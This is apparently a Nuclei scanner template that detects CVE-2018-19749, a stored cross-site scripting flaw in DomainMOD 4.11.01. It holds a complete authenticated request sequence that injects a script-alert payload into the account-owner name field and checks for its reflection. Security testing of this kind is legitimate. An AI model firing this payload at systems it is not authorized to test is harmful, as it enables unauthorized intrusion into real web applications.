id: CVE-2018-19749

info:
   name: DomainMOD 4.11.01 - Cross-Site Scripting
   author: arafatansari
   severity: medium
   description: |
     DomainMOD 4.11.01 is vulnerable to Cross Site Scripting (XSS) via assets/add/account-owner.php Owner name field.
   reference:
     - https://www.exploit-db.com/exploits/45941/
     - https://nvd.nist.gov/vuln/detail/CVE-2018-19749
   metadata:
     verified: true
   tags: cve,cve2018,domainmod,xss,authenticated

requests:
   - raw:
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded

         new_username={{username}}&new_password={{password}}

       - |
         POST /assets/add/account-owner.php HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded

         new_owner=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_notes=

       - |
         GET /assets/account-owners.php HTTP/1.1
         Host: {{Hostname}}

     cookie-reuse: true
     redirects: true
     max-redirects: 2
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
           - '"><script>alert(document.domain)</script></a>'

       - type: word
         part: header
         words:
           - text/html

       - type: status
         status:
           - 200
